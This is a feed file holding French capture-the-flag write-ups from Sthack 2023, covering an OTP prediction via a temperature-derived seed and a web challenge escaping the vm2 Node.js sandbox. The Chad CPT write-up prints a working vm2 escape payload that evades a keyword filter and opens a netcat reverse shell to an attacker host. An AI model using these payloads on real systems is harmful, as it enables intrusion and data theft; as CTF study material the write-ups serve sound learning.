+                &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+                &lt;span class=&quot;c&quot;&gt;// On va ajouter les multiples du périmètre, et maj la valeur maximale si besoin&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;perimeter_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perimeter_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result_count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;result_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perimeter_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Result is: {}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="Lehack-2023" /><summary type="html">Triangle Wars</summary></entry><entry><title type="html">Cant seem to make you mind</title><link href="http://localhost:4000/sthack-2023/cant_seem_to_make_you_mind.html" rel="alternate" type="text/html" title="Cant seem to make you mind" /><published>2023-06-30T00:00:00+02:00</published><updated>2023-06-30T00:00:00+02:00</updated><id>http://localhost:4000/sthack-2023/cant_seem_to_make_you_mind</id><content type="html" xml:base="http://localhost:4000/sthack-2023/cant_seem_to_make_you_mind.html">&lt;p&gt;Voici un petit write up d’un challenge physique proposé de lors de la Sthack 2023  : Can’t seem to make you mind &lt;/p&gt;
+
+&lt;p&gt;Ce challenge nous mettait dans la peau d’un Hacktiviste cherchant à s’infiltrer dans les locaux de Evil Corp. Derrière une porte protégée par un Code PIN se trouve tous leurs sale petits secrets, et malheureusement pour eux : on a obtenu ce code et on va bientôt pouvoir les exposés à la face du monde.&lt;/p&gt;
+
+&lt;p&gt;MAIS, car il y a toujours un mais (à l’image d’un épisode de Mr Robot, avoir le code ne suffit pas car le système est protégé par une double authentification : un OTP (One Time Password) est envoyé par SMS et il faut rentrer ce code dans les &lt;strong&gt;3 minutes&lt;/strong&gt; et en moins de &lt;strong&gt;10 tentatives&lt;/strong&gt;. Et bien évidemment : nous n’avons pas accès à ce téléphone.&lt;/p&gt;
+
+&lt;p&gt;Là vous vous dites : &lt;em&gt;“Mais comment contourner une MFA, cette sécurité spécifiquement conçu pour vérifier l’identité de la personne qui rentre un mot de passe ?&lt;/em&gt;”&lt;/p&gt;
+
+&lt;p&gt;Tout d’abord, pour resituer les choses, nous avions accès à un véritable boitier d’accès dont voici une reproduction à nu (qui ne rend pas hommage au soin apporté à la finition par le concepteur du chall mais que voulez vous, dans le feu de l’action à 5h du matin, on oublie de prendre des photos)
+&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/c00414212c715b81be848b01f6a9d1a3.png&quot; alt=&quot;c00414212c715b81be848b01f6a9d1a3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous avions également accès à la doc explicative ainsi qu’au code de l’application et grâce à lui, on peut d’ores et déjà noter une première information depuis les directives include : 
+Le boitier utilise un Raspberry Pico comme micro controleur :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/b74edf8351cf5356fea3368f5f965955.png&quot; alt=&quot;b74edf8351cf5356fea3368f5f965955.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tout d’abord, nous avons regardé du côté de l’envoi de SMS si y a pas possibilité de modifier le code pour recevoir le SMS, mais les valeurs sont écrite en dur dans le programme.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/25b261150b0e312f4290d7a7d7185753.png&quot; alt=&quot;25b261150b0e312f4290d7a7d7185753.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Et puis en regardant comment l’OTP est généré, nous avons tout de suite remarqué une chose : 
+La seed (la valeur initial qui est utilisée pour créer de l’aléatoire et donc éviter que le mot de passe soit prédictible) n’utilise pas la façon habituelle de faire des micro controleur :&lt;/p&gt;
+
+&lt;p&gt;En effet, d’habitude pour créer une seed, les micro contoleur vont lire la valeur du voltage sur une de leur borne qui n’est relié à aucun composant : la valeur va ainsi dépendre du bruit ambient (onde radio, interférence des téléphones portables, fond diffus cosmologique etc…). Ce qui rend la prédiction quasiment impossible.&lt;/p&gt;
+
+&lt;p&gt;Or ici, la seed est récupérée à partir de la valeur de la température relevé par un capteur interne :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/fdbaf316187c94cc69cc39a57d53e806.png&quot; alt=&quot;fdbaf316187c94cc69cc39a57d53e806.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Et une température :  ça peut se controler et si on connait la valeur que va renvoyer le capteur, on peut ainsi prévoir la valeur du code OTP.&lt;/p&gt;
+
+&lt;p&gt;A notre disposition, il y a en effet une bombe à froid dont la fiche technique spécifie la température exacte (En l’occurence la notre était à -35 C°) :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/090fdf58368c7c63863d649655bb7a9a.png&quot; alt=&quot;090fdf58368c7c63863d649655bb7a9a.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Désormais nous n’avions plus qu’à lire la datasheet technique du Raspberry Pico afin de trouver des informations sur comment le catpeur lit la température et surtout sous quel format la fonction &lt;em&gt;read_onboard_temperature()&lt;/em&gt; renvoit la valeur.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/6291c0153bc28b1f135e90a9707d0e28.png&quot; alt=&quot;6291c0153bc28b1f135e90a9707d0e28.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Alors nous avons recherché dans ce document de 639 pages https://datasheets.raspberrypi.com/rp2040/rp2040-datasheet.pdf 
+, l’information qu’il nous fallait et à la page 566 nous avons trouvé ceci :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/75b339ff373fc15088f967dd870fc823.png&quot; alt=&quot;75b339ff373fc15088f967dd870fc823.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Super, plus qu’à faire une simple équation pour retrouver la valeur &lt;em&gt;raw&lt;/em&gt; pour T= -35, super facile non ? … non ?&lt;/p&gt;
+
+&lt;p&gt;Et c’est ici que malheureusement, nous avons échoué car oui cher lecteur ou lectrice : 
+le flag on l’a pas eu.&lt;/p&gt;
+
+&lt;p&gt;Je pourrais vous lister tout un tas d’excuse à base de manque de sommeil et de temps, de nos outils qui ont mal géré les nombres à virgules etc..  Bref ça n’a pas marché.&lt;/p&gt;
+
+&lt;p&gt;Mais en reprenant à froid (et en discutant avec le créateur du challenge), voici le résultat qui aurait pu nous apporter le flag :&lt;/p&gt;
+
+&lt;p&gt;Nous savons que la température est calculé comme ceci :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uint16_t raw = adc_read();
+const float conversion_factor = 3.3f / (1&amp;lt;&amp;lt;12); 
+float result = raw * conversion_factor;
+float temp = 27 - (result -0.706)/0.001721;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si on effectue l’opération inverse, nous pouvons définir l’expression suivante :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;raw = ((27 - (-35)) * 0.001721 + 0.706) / conversion_factor
+raw = 0.812702 / (3.3 / 4096)
+raw = 1008,7355733333 = 1008 (vu qu&apos;à l&apos;origine c&apos;est un type int)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;On reprend le code de l’application qu’on modifie pour obtenir la valeur de l’OTP :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define OTP_MIN 100000
+#define OTP_MAX 999999
+
+int main(void){
+	int read_value_for_negative_35 = 1008;
+	unsigned int seed = read_value_for_negative_35 + 324092;
+	srand(seed);		 
+	int otp = OTP_MIN + rand() % (OTP_MAX + 1 - OTP_MIN); 
+	printf(&quot;l&apos;OTP est : %d\n&quot;, otp);
+	return(1);
+	}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/8d1337025d434fbf4c0033890fc18baf.png&quot; alt=&quot;8d1337025d434fbf4c0033890fc18baf.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Il nous aurait ensuite fallu refroidire le boitier jusqu’à une température de -35 C° puis entrée le code PIN initial puis l’OTP pour ouvrir la porte et accéder aux sombres secrets de Evil Corp.&lt;/p&gt;</content><author><name></name></author><category term="Sthack-2023" /><summary type="html">Voici un petit write up d’un challenge physique proposé de lors de la Sthack 2023 : Can’t seem to make you mind </summary></entry><entry><title type="html">Chad CPT</title><link href="http://localhost:4000/sthack-2023/Chad-CPT.html" rel="alternate" type="text/html" title="Chad CPT" /><published>2023-05-12T00:00:00+02:00</published><updated>2023-05-12T00:00:00+02:00</updated><id>http://localhost:4000/sthack-2023/Chad-CPT</id><content type="html" xml:base="http://localhost:4000/sthack-2023/Chad-CPT.html">&lt;h1 id=&quot;chad-cpt&quot;&gt;Chad CPT&lt;/h1&gt;
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;Pour cette édition de la Sthack 2023, nous avons eu le droit à une très grande variété de challenge. Nous vous proposons ici une résolution de l’épreuve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChadCPT&lt;/code&gt;, un challenge de type web avec une “IA” un peu trop permissive.
+Voici l’énoncé :&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Do you know Chad CPT ?
+The new SCAM “AI” which can only solve simple math (like 1+1), this “AI” is pretty stoned and does not seem to handle failure…
+Retrieve the value of the flag located in the database.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/interface.png&quot; alt=&quot;interface&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;L’application ChadCPT consiste en un formulaire à une seule entrée, ayant pour objectif de répondre à des opérations arithmétiques de type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2+2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3*3&lt;/code&gt;, …&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/3+3.png&quot; alt=&quot;3+3&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;recherche-de-bug&quot;&gt;Recherche de bug&lt;/h2&gt;
+
+&lt;p&gt;Nous cherchons dans un premier temps à réaliser un bug sur l’application dans le but d’observer des situations potentiellement non prévues. Parmi les bugs classiques pouvant intervenir lors d’opérations arithmétiques, nous retrouvons la fameuse division par zéro.&lt;/p&gt;
+
+&lt;p&gt;En effectuant une division par zéro telle que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3/0&lt;/code&gt;, l’application nous retourne une erreur &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Infinity&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/30.png&quot; alt=&quot;30&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cette erreur non traitée est typique d’un programme JavaScript :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/infinity.png&quot; alt=&quot;Infinity&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Là où une application python (par exemple) aurait retourné une erreur de type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZeroDivisonError&lt;/code&gt; :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/python.png&quot; alt=&quot;python&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Du JavaScript côté serveur, nous partons donc dans l’hypothèse d’une application développée avec NodeJS.
+Le programme étant réceptif aux booléens (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt; et &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;), nous tentons ensuite de voir si celle-ci peut accepter les équations sous forme de conditions JavaScript. Effectivement &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1==1&lt;/code&gt; nous répond &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, quand &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1==2&lt;/code&gt; résulte en l’absence de réponse (synonyme ici de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/1==1.png&quot; alt=&quot;1==1&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/1==2.png&quot; alt=&quot;1==2&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous pouvons alors proposer des égalités telles que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;test&quot;.length==4&lt;/code&gt; afin de valider la présence d’un moteur JavaScript côté serveur, et également garder en tête la possibilité d’utiliser des égalités pour une potentielle exploitation à l’aveugle.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/length==4.png&quot; alt=&quot;length==4&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Après avoir confirmé la présence de NodeJS, nous pouvons alors tenter d’exécuter les fonctions clefs du langage pouvant permettre d’élever nos privilèges. La fonction &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval(&amp;lt;instruction&amp;gt;)&lt;/code&gt; fonctionne et parait alors idéale pour tenter d’exécuter du code JavaScript sans être gêné par l’interpréteur en attente d’un input incluant une opération arithmétique.&lt;/p&gt;
+
+&lt;h2 id=&quot;découverte-de-lenvironnement-dexécution&quot;&gt;Découverte de l’environnement d’exécution&lt;/h2&gt;
+
+&lt;p&gt;NodeJS est particulièrement riche par ses modules (natifs ou non), mais nous observons que leur import reste impossible, sans savoir si ce sont les modules qui sont introuvables ou l’instruction &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;require&lt;/code&gt; qui est bloquée :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/fs.png&quot; alt=&quot;fs&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous tentons également de créer un processus à part dans le but d’y injecter une commande système. Cette opération est notamment possible via l’utilisation de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;child_process&lt;/code&gt;. Nous notons cependant que l’application réalise un contrôle sécurité et va alors bloquer toute requête contenant le mot clef &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;process&lt;/code&gt; avant même de l’interpréter.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/process.png&quot; alt=&quot;process&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pour contourner ce blocage, nous pouvons alors dynamiquement diviser et concaténer le mot de la manière suivante : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;pro&quot;+&quot;cess&quot;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/pro+cess.png&quot; alt=&quot;pro+cess&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le message d’erreur disparait, le contournement est alors fonctionnel.&lt;/p&gt;
+
+&lt;p&gt;Dans des situations dit de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jail&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sandbox&lt;/code&gt;, le programme fait en sorte de nous permettre d’exécuter les commandes natives du langage, tout en empêchant l’exécution de commandes systèmes sur l’hôte. Notre objectif est alors de gagner des informations sur cet environnement, et en trouver les failles pour en abuser.&lt;/p&gt;
+
+&lt;p&gt;Nous observons alors l’environnement d’exécutions. NodeJS étant un langage supportant la philosophie objet, nous tentons de lui faire afficher les propriétés de son objet courant &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;this&lt;/code&gt; via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object.getOwnPropertyNames(this)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Nous récupérons alors un grand nombre de propriétés de l’objet courant, dont une propriété &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Nous nous informons alors sur &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vm2&lt;/code&gt; et apprenons qu’il s’agit d’une sandbox NodeJS :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/vm2.png&quot; alt=&quot;vm2&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Une première hypothèse est d’observer les mauvaises configurations/utilisations/déploiements qui pourraient mener à un échappement de la sandbox vm2. Cette hypothèse a fait œuvre de très nombreux tests, sans résultats.&lt;/p&gt;
+
+&lt;p&gt;Nous observons alors que deux failles ont récemment (avril 2023) été publiées :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CVE-2023-29017&lt;/li&gt;
+  &lt;li&gt;CVE-2023-29199&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Des preuves d’exploitation sont également disponibles, ce qui facilite l’exploitation :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/vm2cve.png&quot; alt=&quot;vm2cve&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d&lt;/p&gt;
+
+&lt;p&gt;(Le second POC s’avérant plus stable pour maintenir une connexion ouverte, la suite de cet article utilisera alors l’exploit ici noté &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vm2_3.9.14_exploit_2.js&lt;/code&gt;).&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
+
+&lt;p&gt;Dans ce POC, nous avons tout d’abord la mise en place d’un environnement vm2 minimal, puis l’exécution de l’exploit :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/exploit.png&quot; alt=&quot;exploit&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous récupérons alors la partie surlignée ci-dessus. Les modifications à appliquer sont les suivantes :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Remplacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;touch flag&lt;/code&gt; par une commande qui nous intéresse. Nous souhaitons obtenir un accès au système, la commande NetCat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc &amp;lt;IP_serveur_attaquant&amp;gt; &amp;lt;port_serveur_attaquant&amp;gt; -e /bin/sh&lt;/code&gt; sera alors sélectionnée pour un reverse-shell.&lt;/li&gt;
+  &lt;li&gt;Couper les chaînes contenant le mot « process » pour permettre de contourner la protection en place.&lt;/li&gt;
+  &lt;li&gt;Faire un oneliner JavaScript pour éviter les problèmes liés au retour à la ligne&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Voici le code d’exploitation final :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+Error.prepareStackTrace = (e, frames) =&amp;gt; { var a=&quot;child_pro&quot;+&quot;cess&quot;; var b=&quot;return pro&quot;+&quot;cess&quot;; frames.constructor.constructor(b)().mainModule.require(a).execSync(&apos;nc &amp;lt;IP_serveur_distant&amp;gt; &amp;lt;port_serveur_distant&amp;gt; -e /bin/sh&apos;); }; async function aa(){eval(&quot;1=1&quot;)} aa()
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous initialisons également un serveur NetCat en écoute sur Internet via la commande &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lvp &amp;lt;port&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;L’envoi du payload permet alors de récupérer un shell sur le serveur distant :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/nc.png&quot; alt=&quot;nc&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;phase-de-post-exploitation&quot;&gt;Phase de post-exploitation&lt;/h2&gt;
+
+&lt;p&gt;Nous remarquons que nous sommes connectés sur le serveur en tant que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;appuser&lt;/code&gt;, après quelques recherches dans les différents dossiers, nous relisons à tête reposée l’énoncé : il faut trouver les accès à une &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base de données&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Nous trouvons un premier indice dans le fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, un utilisateur &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redis&lt;/code&gt; est présent. Nous savons donc maintenant qu’une base redis est utilisée, l’exécution de la commande &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;env&lt;/code&gt;, listant les variables d’environnement, nous permet de nous conforter dans cette hypothèse :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+appuser@202035c4bee1:/app$ env
+env
+REDIS_URL=redis://redis:6379/2
+HOSTNAME=202035c4bee1
+YARN_VERSION=1.22.19
+PWD=/app
+HOME=/home/appuser
+LS_COLORS=
+SHLVL=1
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+NODE_VERSION=19.9.0
+_=/usr/bin/env
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous nous connectons sur le port 6379 hébergeant le service redis, la connexion fonctionne :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/redis.png&quot; alt=&quot;redis&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Il ne nous reste plus qu’à y retrouver le flag …&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/flag.png&quot; alt=&quot;flag&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;… et valider l’épreuve.&lt;/p&gt;</content><author><name></name></author><category term="Sthack-2023" /><summary type="html">Chad CPT Introduction</summary></entry><entry><title type="html">Harduino</title><link href="http://localhost:4000/sthack-2023/Harduino.html" rel="alternate" type="text/html" title="Harduino" /><published>2023-05-12T00:00:00+02:00</published><updated>2023-05-12T00:00:00+02:00</updated><id>http://localhost:4000/sthack-2023/Harduino</id><content type="html" xml:base="http://localhost:4000/sthack-2023/Harduino.html">&lt;h1 id=&quot;harduino-writeup&quot;&gt;Harduino writeup&lt;/h1&gt;
+
+&lt;h2 id=&quot;préambule&quot;&gt;Préambule&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;Arduino est la marque d’une plateforme de prototypage open-source qui permet aux utilisateurs de créer des objets électroniques interactifs à partir de cartes électroniques matériellement libres sur lesquelles se trouve un microcontrôleur.&lt;/em&gt; &lt;a href=&quot;https://fr.wikipedia.org/wiki/Arduino&quot;&gt;Wikipédia&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Le nom du challenge nous donne une indication sur certains éléments du challenge. Nous allons sûrement a un certain point avoir à faire à une carte Arduino.&lt;/p&gt;
+
+&lt;h2 id=&quot;analyse-du-pcapng&quot;&gt;Analyse du Pcapng&lt;/h2&gt;
+
+&lt;p&gt; Le challenge commence avec un fichier pcapng que nous ouvrons avec Wireshark.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/tcp_dump_github.png&quot; alt=&quot;&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous observons une requête HTTP vers un Github ainsi que différents échanges TCP.&lt;/p&gt;
+
+&lt;p&gt;La page Github est la suivante :&lt;/p&gt;
+
+&lt;p&gt;https://github.com/crazyhardwaredev/harduino_loader/releases/download/ClosedSource/harduino_OTA&lt;/p&gt;
+
